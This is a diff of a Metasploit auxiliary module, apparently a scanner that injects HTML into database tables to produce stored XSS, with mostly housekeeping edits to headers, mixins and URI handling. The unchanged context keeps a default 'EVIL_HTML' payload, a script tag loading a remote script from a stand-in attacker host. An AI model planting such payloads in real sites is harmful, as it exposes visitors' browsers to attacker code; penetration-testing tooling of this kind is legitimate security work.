@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'rex/proto/http'
@@ -17,8 +13,8 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WMAPScanUniqueQuery
 	include Msf::Auxiliary::Scanner
+	include Msf::Auxiliary::WmapModule
 
 
 	def initialize(info = {})
@@ -30,8 +26,7 @@ class Metasploit3 < Msf::Auxiliary
 				XSS attack to redirect user browser to a attacker controller website.
 			},
 			'Author'         => [ 'et' ],
-			'License'        => BSD_LICENSE,
-			'Version'        => '$Revision$'))
+			'License'        => BSD_LICENSE))
 
 		register_options(
 			[
@@ -43,10 +38,6 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('EVIL_HTML', [ true,  "Evil HTML to add to tables", '<script src=http://browser-autopwn.com/evilscript.js></script>']),
 			], self.class)
 
-	end
-
-	def wmap_enabled
-		false
 	end
 
 	def run_host(ip)
@@ -90,7 +81,7 @@ EOF
 
 	begin
 		normalres = send_request_cgi({
-			'uri'          =>  datastore['URI'],
+			'uri'          =>  normalize_uri(datastore['URI']),
 			'vars_get'     =>  gvars,
 			'method'       => 'GET',
 			'ctype'        => 'text/plain'
